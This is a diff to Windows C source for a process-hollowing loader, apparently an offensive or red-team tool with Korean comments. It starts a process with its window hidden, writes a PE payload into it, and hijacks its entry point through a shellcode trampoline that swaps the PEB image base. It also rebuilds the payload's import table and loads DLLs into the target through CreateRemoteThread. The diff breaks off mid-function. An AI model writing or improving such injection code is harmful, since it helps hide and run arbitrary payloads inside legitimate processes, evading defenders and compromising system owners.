@@ -1,11 +1,13 @@
 #define _CRT_SECURE_NO_WARNINGS
 
 #include <Windows.h>
+#include <TlHelp32.h>
 #include <winternl.h>
 #include <metahost.h>
 #include <mscoree.h>
 #include <oleauto.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <stddef.h>
 #include <string.h>
 
@@ -35,11 +37,21 @@ BOOL IsManagedPE(IN const BYTE* pBuffer, IN DWORD dwSize);
 BOOL RunManagedAssembly(IN const BYTE* pBuffer, IN DWORD dwSize);
 BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms,
     OUT PPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead);
-BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx);
+BOOL InstallEntryPointTrampoline(IN HANDLE hProcess,
+    IN ULONG_PTR uOriginalEntryPoint, IN ULONG_PTR uPebImageBaseField,
+    IN ULONG_PTR uPayloadBase, IN ULONG_PTR uPayloadEntryPoint,
+    OUT PBYTE* ppRemoteGateState);
+BOOL RepairRemoteIAT(IN HANDLE hProcess, IN PBYTE pPeBuffer,
+    IN DWORD dwPeSize, IN PIMAGE_NT_HEADERS pImgNtHdrs,
+    IN ULONG_PTR uRemoteBase);
 BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress,
     IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr);
 VOID PrintOutput(IN HANDLE StdOutRead);
-BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR cProcessParms);
+BOOL StartStandardInputForwarder(IN OUT HANDLE* pChildStdInWrite,
+    OUT HANDLE* pForwardThread);
+BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCSTR cRemoteProcessImage,
+    IN DWORD dwPeSize, IN OPTIONAL LPCSTR cProcessParms,
+    IN DWORD dwTimeoutMs);
 
 
 /* ---------------------------------------------------------------
@@ -515,6 +527,18 @@ BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR 
         goto _CLEANUP;
     }
 
+    // 부모가 사용할 pipe 끝은 자식에게 상속되면 안 된다.
+    // 특히 StdInWrite가 상속되면 자식이 자기 stdin의 write end를
+    // 계속 보유하게 되어 부모가 닫아도 EOF를 받지 못한다.
+    if (!SetHandleInformation(StdInWrite, HANDLE_FLAG_INHERIT, 0)) {
+        PRINT_WINAPI_ERR("SetHandleInformation[stdin-write]");
+        goto _CLEANUP;
+    }
+    if (!SetHandleInformation(StdOutRead, HANDLE_FLAG_INHERIT, 0)) {
+        PRINT_WINAPI_ERR("SetHandleInformation[stdout-read]");
+        goto _CLEANUP;
+    }
+
     StartupInfo.cb          = sizeof(StartupInfo);
     StartupInfo.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
     StartupInfo.wShowWindow = SW_HIDE;
@@ -522,8 +546,10 @@ BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR 
     StartupInfo.hStdOutput  = StdOutWrite;
     StartupInfo.hStdError   = StdOutWrite;
 
+    // 실행 파일 경로에 공백이 있어도 첫 토큰이 잘리지 않도록 인용한다.
     cbCommand = strlen(cRemoteProcessImage) +
-        (cProcessParms && *cProcessParms ? strlen(cProcessParms) + 1 : 0) + 1;
+        (cProcessParms && *cProcessParms ? strlen(cProcessParms) + 1 : 0) +
+        3; // opening quote + closing quote + NUL
 
     cRemoteProcessCmnd = (LPSTR)LocalAlloc(LPTR, cbCommand);
     if (!cRemoteProcessCmnd) {
@@ -532,9 +558,11 @@ BOOL CreateTheHollowedProcess(IN LPCSTR cRemoteProcessImage, IN OPTIONAL LPCSTR 
     }
 
     if (cProcessParms && *cProcessParms)
-        sprintf_s(cRemoteProcessCmnd, cbCommand, "%s %s", cRemoteProcessImage, cProcessParms);
+        sprintf_s(cRemoteProcessCmnd, cbCommand, "\"%s\" %s",
+                  cRemoteProcessImage, cProcessParms);
     else
-        sprintf_s(cRemoteProcessCmnd, cbCommand, "%s", cRemoteProcessImage);
+        sprintf_s(cRemoteProcessCmnd, cbCommand, "\"%s\"",
+                  cRemoteProcessImage);
 
     printf("[*] Spawning: %s\n", cRemoteProcessCmnd);
 
@@ -562,19 +590,613 @@ _CLEANUP:
 
 
 /* ---------------------------------------------------------------
- * Overwrite remote PEB ImageBaseAddress
+ * 원래 Windows loader 초기화가 끝난 뒤 다음 순서로 동작한다.
+ *   1) PEB ImageBaseAddress를 payload base로 변경
+ *   2) payload entry point로 점프
+ *
+ * 원래 entry에는 12-byte jump만 쓴다. remote gate는 원래 loader
+ * 초기화가 끝났음을 부모에게 알리고, 부모가 IAT를 복구할 때까지
+ * 기다린 후 PEB 교체와 payload jump를 수행한다.
  * --------------------------------------------------------------- */
-BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {
-    ULONG_PTR uRemoteImageBaseOffset = Rdx + offsetof(PEB, Reserved3[1]);
-    SIZE_T    NumberOfBytesWritten   = 0;
+BOOL InstallEntryPointTrampoline(IN HANDLE hProcess,
+    IN ULONG_PTR uOriginalEntryPoint, IN ULONG_PTR uPebImageBaseField,
+    IN ULONG_PTR uPayloadBase, IN ULONG_PTR uPayloadEntryPoint,
+    OUT PBYTE* ppRemoteGateState) {
 
-    if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset,
-                            &uPeBaseAddress, sizeof(PVOID), &NumberOfBytesWritten) ||
-        NumberOfBytesWritten != sizeof(PVOID)) {
-        PRINT_WINAPI_ERR("WriteProcessMemory[PEB]");
+    BYTE entryJump[12] = {
+        0x48, 0xB8,                         // mov rax, imm64
+        0, 0, 0, 0, 0, 0, 0, 0,
+        0xFF, 0xE0                          // jmp rax
+    };
+    BYTE bootstrap[64] = {
+        0x48, 0xB8,                         // mov rax, reached flag
+        0, 0, 0, 0, 0, 0, 0, 0,
+        0xC6, 0x00, 0x01,                   // mov byte ptr [rax], 1
+        0x80, 0x78, 0x01, 0x01,             // cmp byte ptr [rax+1], 1
+        0x74, 0x04,                         // je released
+        0xF3, 0x90,                         // pause
+        0xEB, 0xF6,                         // jmp wait
+        0x48, 0xB8,                         // released: mov rax, PEB field
+        0, 0, 0, 0, 0, 0, 0, 0,
+        0x48, 0xBA,                         // mov rdx, payload base
+        0, 0, 0, 0, 0, 0, 0, 0,
+        0x48, 0x89, 0x10,                   // mov [rax], rdx
+        0x48, 0xB8,                         // mov rax, payload entry
+        0, 0, 0, 0, 0, 0, 0, 0,
+        0xFF, 0xE0,                         // jmp rax
+        0, 0, 0, 0,                         // padding
+        0,                                  // reached flag (offset 62)
+        0                                   // release flag (offset 63)
+    };
+    PBYTE remoteBootstrap = NULL;
+    DWORD oldProtection = 0;
+    DWORD ignoredProtection = 0;
+    SIZE_T written = 0;
+
+    if (!ppRemoteGateState)
+        return FALSE;
+    *ppRemoteGateState = NULL;
+
+    remoteBootstrap = (PBYTE)VirtualAllocEx(
+        hProcess, NULL, sizeof(bootstrap),
+        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!remoteBootstrap) {
+        PRINT_WINAPI_ERR("VirtualAllocEx[entry-bootstrap]");
         return FALSE;
     }
-    printf("[*] PEB ImageBaseAddress patched: 0x%p\n", (PVOID)uPeBaseAddress);
+
+    {
+        ULONG_PTR reachedFlag = (ULONG_PTR)(remoteBootstrap + 62);
+        memcpy(&bootstrap[2],  &reachedFlag, sizeof(reachedFlag));
+    }
+    memcpy(&bootstrap[25], &uPebImageBaseField, sizeof(uPebImageBaseField));
+    memcpy(&bootstrap[35], &uPayloadBase, sizeof(uPayloadBase));
+    memcpy(&bootstrap[48], &uPayloadEntryPoint, sizeof(uPayloadEntryPoint));
+
+    if (!WriteProcessMemory(hProcess, remoteBootstrap,
+                            bootstrap, sizeof(bootstrap), &written) ||
+        written != sizeof(bootstrap)) {
+        PRINT_WINAPI_ERR("WriteProcessMemory[entry-bootstrap]");
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    if (!FlushInstructionCache(hProcess, remoteBootstrap,
+                               sizeof(bootstrap))) {
+        PRINT_WINAPI_ERR("FlushInstructionCache[entry-bootstrap]");
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    {
+        ULONG_PTR bootstrapAddress = (ULONG_PTR)remoteBootstrap;
+        memcpy(&entryJump[2], &bootstrapAddress, sizeof(bootstrapAddress));
+    }
+
+    if (!VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
+                          sizeof(entryJump), PAGE_EXECUTE_READWRITE,
+                          &oldProtection)) {
+        PRINT_WINAPI_ERR("VirtualProtectEx[original-entry]");
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!WriteProcessMemory(hProcess, (PVOID)uOriginalEntryPoint,
+                            entryJump, sizeof(entryJump), &written) ||
+        written != sizeof(entryJump)) {
+        PRINT_WINAPI_ERR("WriteProcessMemory[entry-trampoline]");
+        VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
+                         sizeof(entryJump), oldProtection,
+                         &ignoredProtection);
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!FlushInstructionCache(hProcess, (PVOID)uOriginalEntryPoint,
+                               sizeof(entryJump))) {
+        PRINT_WINAPI_ERR("FlushInstructionCache");
+        VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
+                         sizeof(entryJump), oldProtection,
+                         &ignoredProtection);
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    if (!VirtualProtectEx(hProcess, (PVOID)uOriginalEntryPoint,
+                          sizeof(entryJump), oldProtection,
+                          &ignoredProtection)) {
+        PRINT_WINAPI_ERR("VirtualProtectEx[restore-entry]");
+        VirtualFreeEx(hProcess, remoteBootstrap, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    printf("[*] Entry trampoline installed: 0x%p -> 0x%p -> 0x%p\n",
+           (PVOID)uOriginalEntryPoint, remoteBootstrap,
+           (PVOID)uPayloadEntryPoint);
+    *ppRemoteGateState = remoteBootstrap + 62;
+    return TRUE;
+}
+
+
+/* ---------------------------------------------------------------
+ * Raw PE의 RVA를 파일 버퍼 주소로 변환
+ * --------------------------------------------------------------- */
+static PBYTE RawPointerFromRva(IN PBYTE pPeBuffer, IN DWORD dwPeSize,
+    IN PIMAGE_NT_HEADERS pImgNtHdrs, IN DWORD dwRva, IN SIZE_T cbRequired) {
+
+    if (!pPeBuffer || !pImgNtHdrs)
+        return NULL;
+
+    if (dwRva < pImgNtHdrs->OptionalHeader.SizeOfHeaders) {
+        if ((SIZE_T)dwRva + cbRequired > dwPeSize)
+            return NULL;
+        return pPeBuffer + dwRva;
+    }
+
+    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pImgNtHdrs);
+    for (WORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
+        DWORD sectionSize = sections[i].Misc.VirtualSize;
+        if (sectionSize < sections[i].SizeOfRawData)
+            sectionSize = sections[i].SizeOfRawData;
+
+        if (dwRva < sections[i].VirtualAddress ||
+            dwRva - sections[i].VirtualAddress >= sectionSize)
+            continue;
+
+        DWORD offsetInSection = dwRva - sections[i].VirtualAddress;
+        if (offsetInSection >= sections[i].SizeOfRawData)
+            return NULL;
+
+        SIZE_T rawOffset = (SIZE_T)sections[i].PointerToRawData +
+                           offsetInSection;
+        if (rawOffset + cbRequired > dwPeSize)
+            return NULL;
+        return pPeBuffer + rawOffset;
+    }
+
+    return NULL;
+}
+
+
+static LPCSTR PathBaseName(IN LPCSTR path) {
+    LPCSTR slash = strrchr(path, '\\');
+    LPCSTR forwardSlash = strrchr(path, '/');
+    if (!slash || (forwardSlash && forwardSlash > slash))
+        slash = forwardSlash;
+    return slash ? slash + 1 : path;
+}
+
+
+static PBYTE FindRemoteModuleBase(IN DWORD processId,
+    IN LPCSTR moduleName) {
+
+    HANDLE snapshot = INVALID_HANDLE_VALUE;
+    MODULEENTRY32 entry = { 0 };
+    PBYTE result = NULL;
+
+    for (DWORD attempt = 0; attempt < 5; attempt++) {
+        snapshot = CreateToolhelp32Snapshot(
+            TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
+        if (snapshot != INVALID_HANDLE_VALUE)
+            break;
+        if (GetLastError() != ERROR_BAD_LENGTH)
+            return NULL;
+    }
+    if (snapshot == INVALID_HANDLE_VALUE)
+        return NULL;
+
+    entry.dwSize = sizeof(entry);
+    if (Module32First(snapshot, &entry)) {
+        do {
+            if (_stricmp(entry.szModule, PathBaseName(moduleName)) == 0) {
+                result = entry.modBaseAddr;
+                break;
+            }
+        } while (Module32Next(snapshot, &entry));
+    }
+
+    CloseHandle(snapshot);
+    return result;
+}
+
+
+static BOOL LoadLibraryIntoRemoteProcess(IN HANDLE hProcess,
+    IN LPCSTR libraryName);
+
+
+/* ---------------------------------------------------------------
+ * 로컬 함수의 소유 DLL + RVA를 구해 대상의 같은 DLL 기준 주소로 환산.
+ * forwarded export도 GetProcAddress가 반환한 실제 소유 DLL을 사용한다.
+ * 실제 소유 DLL이 대상에 없으면 선택적으로 원격 적재한 뒤 재시도한다.
+ * --------------------------------------------------------------- */
+static BOOL TranslateProcedureAddressToRemoteEx(IN HANDLE hProcess,
+    IN FARPROC localProcedure, OUT ULONG_PTR* pRemoteProcedure,
+    IN BOOL loadMissingOwner) {
+
+    MEMORY_BASIC_INFORMATION localInfo = { 0 };
+    CHAR ownerPath[MAX_PATH] = { 0 };
+    DWORD processId;
+
+    if (!hProcess || !localProcedure || !pRemoteProcedure)
+        return FALSE;
+    *pRemoteProcedure = 0;
+
+    if (!VirtualQuery((LPCVOID)localProcedure, &localInfo,
+                      sizeof(localInfo)) ||
+        localInfo.Type != MEM_IMAGE || !localInfo.AllocationBase)
+        return FALSE;
+
+    HMODULE localOwner = (HMODULE)localInfo.AllocationBase;
+    if (!GetModuleFileNameA(localOwner, ownerPath,
+                            ARRAYSIZE(ownerPath)))
+        return FALSE;
+
+    processId = GetProcessId(hProcess);
+    if (!processId)
+        return FALSE;
+
+    LPCSTR ownerName = PathBaseName(ownerPath);
+    PBYTE remoteOwner = FindRemoteModuleBase(processId, ownerName);
+    if (!remoteOwner && loadMissingOwner) {
+        printf("[*] Remote loading forwarded owner DLL: %s\n",
+               ownerName);
+        if (!LoadLibraryIntoRemoteProcess(hProcess, ownerName)) {
+            fprintf(stderr,
+                    "[-] Unable to load forwarded owner DLL: %s\n",
+                    ownerName);
+            return FALSE;
+        }
+        remoteOwner = FindRemoteModuleBase(processId, ownerName);
+    }
+    if (!remoteOwner) {
+        fprintf(stderr,
+                "[-] Function owner DLL is not loaded in target: %s\n",
+                ownerName);
+        return FALSE;
+    }
+
+    ULONG_PTR offset = (ULONG_PTR)localProcedure -
+                       (ULONG_PTR)localOwner;
+    ULONG_PTR remoteProcedure = (ULONG_PTR)remoteOwner + offset;
+
+    MEMORY_BASIC_INFORMATION remoteInfo = { 0 };
+    if (!VirtualQueryEx(hProcess, (LPCVOID)remoteProcedure,
+                        &remoteInfo, sizeof(remoteInfo)) ||
+        remoteInfo.State != MEM_COMMIT ||
+        remoteInfo.Type != MEM_IMAGE)
+        return FALSE;
+
+    *pRemoteProcedure = remoteProcedure;
+    return TRUE;
+}
+
+
+static BOOL TranslateProcedureAddressToRemote(IN HANDLE hProcess,
+    IN FARPROC localProcedure, OUT ULONG_PTR* pRemoteProcedure) {
+
+    return TranslateProcedureAddressToRemoteEx(
+        hProcess, localProcedure, pRemoteProcedure, TRUE);
+}
+
+
+static BOOL LoadLibraryIntoRemoteProcess(IN HANDLE hProcess,
+    IN LPCSTR libraryName) {
+
+    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+    FARPROC localLoadLibrary = kernel32
+        ? GetProcAddress(kernel32, "LoadLibraryA")
+        : NULL;
+    ULONG_PTR remoteLoadLibrary = 0;
+    PBYTE remoteName = NULL;
+    HANDLE remoteThread = NULL;
+    SIZE_T nameSize;
+    SIZE_T written = 0;
+    BOOL result = FALSE;
+
+    /*
+     * 원격 DLL 적재 함수 자체를 찾을 때는 다시 DLL 적재를 시도하지 않는다.
+     * 그렇지 않으면 LoadLibraryA의 실제 소유 DLL이 없을 때 재귀가 생긴다.
+     */
+    if (!localLoadLibrary ||
+        !TranslateProcedureAddressToRemoteEx(
+            hProcess, localLoadLibrary, &remoteLoadLibrary, FALSE))
+        return FALSE;
+
+    nameSize = strlen(libraryName) + 1;
+    remoteName = (PBYTE)VirtualAllocEx(
+        hProcess, NULL, nameSize,
+        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (!remoteName) {
+        PRINT_WINAPI_ERR("VirtualAllocEx[remote-dll-name]");
+        goto _CLEANUP;
+    }
+
+    if (!WriteProcessMemory(hProcess, remoteName, libraryName,
+                            nameSize, &written) ||
+        written != nameSize) {
+        PRINT_WINAPI_ERR("WriteProcessMemory[remote-dll-name]");
+        goto _CLEANUP;
+    }
+
+    remoteThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteLoadLibrary,
+        remoteName, 0, NULL);
+    if (!remoteThread) {
+        PRINT_WINAPI_ERR("CreateRemoteThread[LoadLibraryA]");
+        goto _CLEANUP;
+    }
+
+    {
+        DWORD wait = WaitForSingleObject(remoteThread, 10000);
+        if (wait != WAIT_OBJECT_0) {
+            if (wait == WAIT_FAILED)
+                PRINT_WINAPI_ERR("WaitForSingleObject[LoadLibraryA]");
+            else
+                fprintf(stderr,
+                        "[-] Remote LoadLibraryA timed out: %s\n",
+                        libraryName);
+            goto _CLEANUP;
+        }
+
+        DWORD threadResult = 0;
+        if (!GetExitCodeThread(remoteThread, &threadResult) ||
+            threadResult == 0) {
+            fprintf(stderr,
+                    "[-] Remote LoadLibraryA failed: %s\n",
+                    libraryName);
+            goto _CLEANUP;
+        }
+    }
+
+    result = TRUE;
+
+_CLEANUP:
+    DELETE_HANDLE(remoteThread);
+    if (remoteName)
+        VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
+    return result;
+}
+
+
+static BOOL EnsureRemoteLibraryLoaded(IN HANDLE hProcess,
+    IN LPCSTR libraryName) {
+
+    DWORD processId = GetProcessId(hProcess);
+    if (!processId)
+        return FALSE;
+
+    if (FindRemoteModuleBase(processId, libraryName))
+        return TRUE;
+
+    printf("[*] Remote loading missing import DLL: %s\n",
+           libraryName);
+    if (!LoadLibraryIntoRemoteProcess(hProcess, libraryName))
+        return FALSE;
+
+    return FindRemoteModuleBase(processId, libraryName) != NULL;
+}
+
+
+/* ---------------------------------------------------------------
+ * 누락된 DLL을 remote LoadLibraryA로 적재한 뒤 원격 IAT 복구
+ *
+ * local GetProcAddress 결과에서 실제 소유 DLL과 RVA를 구한 뒤 대상의
+ * 같은 DLL base에 더하므로 ASLR 차이와 forwarded export를 처리한다.
+ * --------------------------------------------------------------- */
+BOOL RepairRemoteIAT(IN HANDLE hProcess, IN PBYTE pPeBuffer,
+    IN DWORD dwPeSize, IN PIMAGE_NT_HEADERS pImgNtHdrs,
+    IN ULONG_PTR uRemoteBase) {
+
+    IMAGE_DATA_DIRECTORY importDirectory =
+        pImgNtHdrs->OptionalHeader.DataDirectory[
+            IMAGE_DIRECTORY_ENTRY_IMPORT];
+
+    if (!importDirectory.VirtualAddress || !importDirectory.Size) {
+        printf("[*] No import directory\n");
+        return TRUE;
+    }
+
+    DWORD descriptorCount =
+        importDirectory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
+    if (!descriptorCount || descriptorCount > 1024)
+        return FALSE;
+
+    for (DWORD descriptorIndex = 0;
+         descriptorIndex < descriptorCount;
+         descriptorIndex++) {
+
+        DWORD descriptorRva = importDirectory.VirtualAddress +
+            descriptorIndex * sizeof(IMAGE_IMPORT_DESCRIPTOR);
+        PIMAGE_IMPORT_DESCRIPTOR descriptor =
+            (PIMAGE_IMPORT_DESCRIPTOR)RawPointerFromRva(
+                pPeBuffer, dwPeSize, pImgNtHdrs, descriptorRva,
+                sizeof(IMAGE_IMPORT_DESCRIPTOR));
+        if (!descriptor) {
+            fprintf(stderr, "[-] Import descriptor is outside the file\n");
+            return FALSE;
+        }
+
+        if (!descriptor->Name && !descriptor->FirstThunk)
+            break;
+        if (!descriptor->Name || !descriptor->FirstThunk)
+            return FALSE;
+
+        PBYTE libraryNameBytes = RawPointerFromRva(
+            pPeBuffer, dwPeSize, pImgNtHdrs, descriptor->Name, 1);
+        if (!libraryNameBytes)
+            return FALSE;
+        SIZE_T libraryNameLimit =
+            dwPeSize - (SIZE_T)(libraryNameBytes - pPeBuffer);
+        if (!memchr(libraryNameBytes, '\0', libraryNameLimit))
+            return FALSE;
+
+        LPCSTR libraryName = (LPCSTR)libraryNameBytes;
+        HMODULE localModule = LoadLibraryA(libraryName);
+        if (!localModule) {
+            fprintf(stderr, "[-] LoadLibraryA failed for import: %s\n",
+                    libraryName);
+            return FALSE;
+        }
+        if (!EnsureRemoteLibraryLoaded(hProcess, libraryName)) {
+            fprintf(stderr,
+                    "[-] Unable to load import DLL in target: %s\n",
+                    libraryName);
+            return FALSE;
+        }
+
+        DWORD sourceThunkRva = descriptor->OriginalFirstThunk
+            ? descriptor->OriginalFirstThunk
+            : descriptor->FirstThunk;
+        DWORD resolvedCount = 0;
+
+        for (DWORD thunkIndex = 0; thunkIndex < 65536; thunkIndex++) {
+            ULONGLONG thunkRva64 = (ULONGLONG)sourceThunkRva +
+                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
+            ULONGLONG targetRva64 = (ULONGLONG)descriptor->FirstThunk +
+                (ULONGLONG)thunkIndex * sizeof(IMAGE_THUNK_DATA);
+            if (thunkRva64 > MAXDWORD ||
+                targetRva64 + sizeof(ULONG_PTR) >
+                    pImgNtHdrs->OptionalHeader.SizeOfImage) {
+                fprintf(stderr, "[-] Import thunk range is invalid\n");
+                return FALSE;
+            }
+
+            PIMAGE_THUNK_DATA thunk =
+                (PIMAGE_THUNK_DATA)RawPointerFromRva(
+                    pPeBuffer, dwPeSize, pImgNtHdrs,
+                    (DWORD)thunkRva64, sizeof(IMAGE_THUNK_DATA));
+            if (!thunk) {
+                fprintf(stderr, "[-] Import thunk is outside the file\n");
+                return FALSE;
+            }
+            if (!thunk->u1.AddressOfData)
+                break;
+
+            FARPROC functionAddress = NULL;
+            if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
+                functionAddress = GetProcAddress(
+                    localModule,
+                    MAKEINTRESOURCEA(
+                        IMAGE_ORDINAL(thunk->u1.Ordinal)));
+            } else {
+                if (thunk->u1.AddressOfData > MAXDWORD)
+                    return FALSE;
+                PIMAGE_IMPORT_BY_NAME importByName =
+                    (PIMAGE_IMPORT_BY_NAME)RawPointerFromRva(
+                        pPeBuffer, dwPeSize, pImgNtHdrs,
+                        (DWORD)thunk->u1.AddressOfData,
+                        sizeof(WORD) + 1);
+                if (!importByName)
+                    return FALSE;
+
+                PBYTE functionName = (PBYTE)importByName->Name;
+                SIZE_T functionNameLimit =
+                    dwPeSize - (SIZE_T)(functionName - pPeBuffer);
+                if (!memchr(functionName, '\0', functionNameLimit))
+                    return FALSE;
+                functionAddress = GetProcAddress(
+                    localModule, (LPCSTR)functionName);
+            }
+
+            if (!functionAddress) {
+                fprintf(stderr, "[-] GetProcAddress failed in %s\n",
+                        libraryName);
+                return FALSE;
+            }
+
+            ULONG_PTR remoteFunction = 0;
+            if (!TranslateProcedureAddressToRemote(
+                    hProcess, functionAddress, &remoteFunction)) {
+                fprintf(stderr,
+                        "[-] Import address translation failed: %p from %s\n",
+                        functionAddress, libraryName);
+                return FALSE;
+            }
+
+            SIZE_T written = 0;
+            PVOID remoteThunk = (PVOID)(
+                uRemoteBase + (ULONG_PTR)targetRva64);
+            if (!WriteProcessMemory(hProcess, remoteThunk,
+                                    &remoteFunction,
+                                    sizeof(remoteFunction), &written) ||
+                written != sizeof(remoteFunction)) {
+                PRINT_WINAPI_ERR("WriteProcessMemory[IAT]");
+                return FALSE;
+            }
+            resolvedCount++;
+        }
+
+        printf("[*] IAT %-20s : %lu imports resolved\n",
+               libraryName, resolvedCount);
+    }
+
+    printf("[*] Remote IAT repair complete\n");
+    return TRUE;
+}
+
+
+/* ---------------------------------------------------------------
+ * Windows loader가 원래 entry point까지 도달했는지 기다린다.
+ * 이 시점에는 대상의 system DLL mapping이 완료되어 IAT 복구가 가능하다.
+ * --------------------------------------------------------------- */
+static BOOL WaitForRemoteEntryGate(IN HANDLE hProcess,
+    IN HANDLE hStdOutRead, IN PBYTE pRemoteGateState,
+    IN DWORD dwGateTimeoutMs) {
+
+    ULONGLONG started = GetTickCount64();
+
+    for (;;) {
+        BYTE reached = 0;
+        SIZE_T read = 0;
+        if (!ReadProcessMemory(hProcess, pRemoteGateState,
+                               &reached, sizeof(reached), &read) ||
+            read != sizeof(reached)) {
+            PRINT_WINAPI_ERR("ReadProcessMemory[entry-gate]");
+            return FALSE;
+        }
+        if (reached == 1) {
+            printf("[*] Windows loader initialization complete\n");
+            return TRUE;
+        }
+
+        DWORD wait = WaitForSingleObject(hProcess, 0);
+        if (wait == WAIT_OBJECT_0) {
+            DWORD exitCode = 0;
+            GetExitCodeProcess(hProcess, &exitCode);
+            fprintf(stderr,
+                    "[-] Target exited before entry gate: 0x%08lX\n",
+                    exitCode);
+            return FALSE;
+        }
+        if (wait == WAIT_FAILED) {
+            PRINT_WINAPI_ERR("WaitForSingleObject[entry-gate]");
+            return FALSE;
+        }
+
+        PrintOutput(hStdOutRead);
+        if (GetTickCount64() - started >= dwGateTimeoutMs) {
+            fprintf(stderr,
+                    "[-] Timed out waiting for Windows loader initialization\n");
+            SetLastError(ERROR_TIMEOUT);
+            return FALSE;
+        }
+        Sleep(10);
+    }
+}
+
+
+static BOOL ReleaseRemoteEntryGate(IN HANDLE hProcess,
+    IN PBYTE pRemoteGateState) {
+
+    BYTE release = 1;
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProcess, pRemoteGateState + 1,
+                            &release, sizeof(release), &written) ||
+        written != sizeof(release)) {
+        PRINT_WINAPI_ERR("WriteProcessMemory[release-entry-gate]");
+        return FALSE;
+    }
+    printf("[*] Payload entry gate released\n");
     return TRUE;
 }
 
@@ -648,20 +1270,119 @@ VOID PrintOutput(IN HANDLE StdOutRead) {
 
 
 /* ---------------------------------------------------------------
+ * 부모 stdin -> 자식 stdin pipe 전달
+ *
+ * stdout/stderr 수집과 분리된 전용 스레드에서 동작한다. 부모 stdin이
+ * console이면 사용자가 Enter로 입력한 바이트를 전달하고, redirected
+ * pipe/file이면 들어오는 바이트를 그대로 전달한다. 부모 stdin EOF
+ * 또는 write 실패 시 자식 stdin write end를 닫아 EOF를 알린다.
+ * --------------------------------------------------------------- */
+typedef struct _STDIN_FORWARD_CONTEXT {
+    HANDLE ParentStdIn;
+    HANDLE ChildStdInWrite;
+} STDIN_FORWARD_CONTEXT;
+
+static DWORD WINAPI StandardInputForwardThread(IN LPVOID parameter) {
+    STDIN_FORWARD_CONTEXT* context =
+        (STDIN_FORWARD_CONTEXT*)parameter;
+    HANDLE parentStdIn = context->ParentStdIn;
+    HANDLE childStdInWrite = context->ChildStdInWrite;
+    BYTE buffer[4096];
+
+    HeapFree(GetProcessHeap(), 0, context);
+
+    for (;;) {
+        DWORD bytesRead = 0;
+        if (!ReadFile(parentStdIn, buffer, sizeof(buffer),
+                      &bytesRead, NULL) || bytesRead == 0)
+            break;
+
+        DWORD totalWritten = 0;
+        while (totalWritten < bytesRead) {
+            DWORD bytesWritten = 0;
+            if (!WriteFile(childStdInWrite,
+                           buffer + totalWritten,
+                           bytesRead - totalWritten,
+                           &bytesWritten, NULL) ||
+                bytesWritten == 0) {
+                totalWritten = bytesRead;
+                goto _DONE;
+            }
+            totalWritten += bytesWritten;
+        }
+    }
+
+_DONE:
+    DELETE_HANDLE(childStdInWrite);
+    return 0;
+}
+
+
+BOOL StartStandardInputForwarder(IN OUT HANDLE* pChildStdInWrite,
+    OUT HANDLE* pForwardThread) {
+
+    if (!pChildStdInWrite || !*pChildStdInWrite || !pForwardThread)
+        return FALSE;
+    *pForwardThread = NULL;
+
+    HANDLE parentStdIn = GetStdHandle(STD_INPUT_HANDLE);
+    if (!parentStdIn || parentStdIn == INVALID_HANDLE_VALUE) {
+        printf("[*] Parent stdin unavailable; child stdin will receive EOF\n");
+        DELETE_HANDLE(*pChildStdInWrite);
+        return TRUE;
+    }
+
+    STDIN_FORWARD_CONTEXT* context =
+        (STDIN_FORWARD_CONTEXT*)HeapAlloc(
+            GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*context));
+    if (!context) {
+        PRINT_WINAPI_ERR("HeapAlloc[stdin-forward]");
+        return FALSE;
+    }
+
+    context->ParentStdIn = parentStdIn;
+    context->ChildStdInWrite = *pChildStdInWrite;
+
+    HANDLE thread = CreateThread(NULL, 0, StandardInputForwardThread,
+                                 context, 0, NULL);
+    if (!thread) {
+        PRINT_WINAPI_ERR("CreateThread[stdin-forward]");
+        HeapFree(GetProcessHeap(), 0, context);
+        return FALSE;
+    }
+
